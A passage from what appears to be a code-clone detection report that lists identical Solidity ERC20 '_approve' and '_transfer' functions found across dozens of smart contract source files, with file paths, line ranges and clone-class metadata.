        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x75774b445262eE2952CF1a26b5d735Fe648FCE28.sol" startline="100" endline="109" pcid="4337">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xEb0753dfACc48178d482640e009ec23334a91Dc5.sol" startline="97" endline="106" pcid="8556">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xA2F5f226ab0cC49602dFf5e178AC9bC978869395.sol" startline="96" endline="105" pcid="5869">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3505c70Dbf2Cc4ECD84Dd0Bed04f8126c26Ab909.sol" startline="103" endline="112" pcid="1672">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xaD143dB1c4F95b7d90aA399fc45fAbd56a9Ab521.sol" startline="98" endline="107" pcid="6254">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xF3E3E0381509e1B6a83f0D8E41b7219777010A51.sol" startline="99" endline="108" pcid="8886">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3c8B8B3D57AE533C8A34A290327024f915335CA9.sol" startline="99" endline="108" pcid="2140">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x0617c6f1b099dff080a44451a3882b42bfa75188.sol" startline="98" endline="107" pcid="180">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6d019E5B4A50315684EBe38A2d30f95aE1EC35e5.sol" startline="101" endline="110" pcid="4006">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x17A5c49Cb48bf49cc10D1Ec05fE899Bb447811Fd.sol" startline="98" endline="107" pcid="720">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x7639F0fCD891a5c1D72A986258580Bb28c12A94E.sol" startline="100" endline="109" pcid="4407">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xef037B58e38300652e9D341D22DB7979Ef33AD6B.sol" startline="101" endline="110" pcid="8712">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xA55a6E9BFC3Ba7cb2421146B8F111919bCfB0060.sol" startline="96" endline="105" pcid="6025">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xAd222E0eD7193b73694bC09FE40e285F7BADe1F9.sol" startline="96" endline="105" pcid="6269">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xE34d100c26D21eA743c05A18DC0cbc5d223e69a1.sol" startline="97" endline="106" pcid="8234">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xa6AC064774bF25B7Ee251C3F051Aabf28A01DCb4.sol" startline="97" endline="106" pcid="6079">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x30b64f3Ff111F7B1DBD35a92e9a5A7f1395eb2eD.sol" startline="101" endline="110" pcid="1514">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x1684f783064B9F4D6273e9ed11F5D753C193E5E5.sol" startline="100" endline="109" pcid="684">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3D0ff3246C0C91DDF19688A8CAE0b3F9FfFB5090.sol" startline="102" endline="111" pcid="2204">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xfbefc1a66fa6c6fe5107942e12fa981e378b1791.sol" startline="96" endline="105" pcid="9197">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xe022f7a1F743C18e28ABa062FCFa0746CbaE8d32.sol" startline="96" endline="105" pcid="8024">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x2AE6bAa928cFeD647807104d4de73aA779a8f433.sol" startline="98" endline="107" pcid="1284">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x690C351f059c4963362cB75AAb802A2b95bA2B0C.sol" startline="96" endline="105" pcid="3910">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xf86c25675cd74be058a798894008ecf6a67dca21.sol" startline="99" endline="108" pcid="9048">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xA8752c38CaA247fC7724A2D8d4f04e2eD410d7AC.sol" startline="99" endline="108" pcid="6170">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xa724ad0C59f178C3d291081b8aE06d3d23Eb5383.sol" startline="96" endline="105" pcid="6124">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x187ecd1d7d930a356469551f7c71742ac2a7948d.sol" startline="99" endline="108" pcid="778">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3769cd9532CcE8550984AA8388a26Beda0E69401.sol" startline="102" endline="111" pcid="1870">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6232C9abFD76F7052d359e1a277e3a4D2377A3e3.sol" startline="200" endline="209" pcid="3749">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x9c03094376D96C2b5ffd1B1C5129b048438700CF.sol" startline="95" endline="104" pcid="5679">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x81069fF4cb59B3814F5d949A957a686501da2cf5.sol" startline="96" endline="105" pcid="4832">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xdCfb3170A71BE65d6Ae3d70F7B617fa2B467975f.sol" startline="96" endline="105" pcid="7840">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x2f324d85C72E2d25bEA80f1aF03392825e15E49a.sol" startline="94" endline="103" pcid="1435">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xe928e115184bad954b11c477df5e1fc94f04e45d.sol" startline="98" endline="107" pcid="8429">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x821d158c454B3a3Fcef1B9f35DBa9cb0e37C5453.sol" startline="99" endline="108" pcid="4862">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x398Fa4bd97036EB7cF85E84FbDe34959b4E4C396.sol" startline="100" endline="109" pcid="1919">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xdf2b11D6589a98Cf77e8e91B78cE8f2beB3dcbf5.sol" startline="95" endline="104" pcid="8009">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
</class>

<class classid="39" nclones="479" nlines="9" similarity="100">
<source file="systems/source-code/0x019A98258bd5dE47900a0be227087af81Eaf4c69.sol" startline="113" endline="125" pcid="57">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6232C9abFD76F7052d359e1a277e3a4D2377A3e3.sol" startline="211" endline="223" pcid="3750">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x7Fc773d80e0C788c7Ed212d0e86f2CB6a61E9bB3.sol" startline="111" endline="123" pcid="4712">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xBD13AACef22A780AB305c9478a801Ce8752aa7aB.sol" startline="110" endline="122" pcid="6784">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xF3E3E0381509e1B6a83f0D8E41b7219777010A51.sol" startline="110" endline="122" pcid="8887">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6277c6BC834f6A1cCa9905696a5b6d4f459BC736.sol" startline="111" endline="123" pcid="3765">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xf54B624da049ec181B06B2335A53d5c963B12d46.sol" startline="107" endline="119" pcid="8997">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xBe43ad4F6F0B27228aC7E54974a57470862FC8Bf.sol" startline="112" endline="124" pcid="6799">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3c8B8B3D57AE533C8A34A290327024f915335CA9.sol" startline="110" endline="122" pcid="2141">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xef037B58e38300652e9D341D22DB7979Ef33AD6B.sol" startline="112" endline="124" pcid="8713">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x75156ffc59Ed375F98D97dA888f2fe09382640a1.sol" startline="107" endline="119" pcid="4308">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xeFA7f35b824bB9A8696DAeA87172c466f6d8D5A2.sol" startline="114" endline="126" pcid="8743">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6557Eb95E84F9247AFEc5e988b4F9532B80A4497.sol" startline="209" endline="221" pcid="3826">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x766d176a78F7cD88Ea86f9b18b72FF093b4e1DC9.sol" startline="111" endline="123" pcid="4423">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xd4738e9EE70F7C409c5704A8243E2Cf75162098f.sol" startline="111" endline="123" pcid="7582">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x36eDC92606D7cc78F9bf63665eA39Fb5A76b7796.sol" startline="111" endline="123" pcid="1837">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3ce7CAfDEB197967161757d8a44e60e9Bf58bC10.sol" startline="109" endline="121" pcid="2175">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x059DCcB34DeD089dBCe4d1CCd975d6D38891e138.sol" startline="111" endline="123" pcid="166">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3aE19CA727e6c9C06dA578fB34113aF9aC0676ee.sol" startline="111" endline="123" pcid="2007">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x2116bc152192df8a87eb74dc69aa64f6f476f792.sol" startline="110" endline="122" pcid="1011">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xfBB3b5DF228ded41b9450C535Cd115707c6456C1.sol" startline="107" endline="119" pcid="9183">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xf34839a7431d6c70673f3a3bcfb589c042fd219d.sol" startline="104" endline="116" pcid="8857">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x73095365CF296E26D912E095C38FAc6b3fFAD3AF.sol" startline="111" endline="123" pcid="4231">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x020b7C91ca0C63477DF2f68ac47A6c41a370CE37.sol" startline="109" endline="121" pcid="72">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xf35aD950b9A888FF9E9c25B9a71c19dDF57d61F4.sol" startline="111" endline="123" pcid="8872">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x21bcc45a9a9cb57084b6d6409d8fb0717bffeb91.sol" startline="107" endline="119" pcid="1026">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x7E6d55c8dF6E82AfbC76620561cFB99196aC090c.sol" startline="108" endline="120" pcid="4697">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x78102a37f04eb263c1f626702f1c1f98618ea3de.sol" startline="210" endline="222" pcid="4513">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x80243a2b6dfb564459fec3e729fda998a4b7a979.sol" startline="109" endline="121" pcid="4733">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x084C028E04F9C7aa04b2CeE80edE5DA2Fa3bbaF2.sol" startline="108" endline="120" pcid="218">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x7c947C432A8b47feD452DbE026cc6648ad6a2cC6.sol" startline="111" endline="123" pcid="4666">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
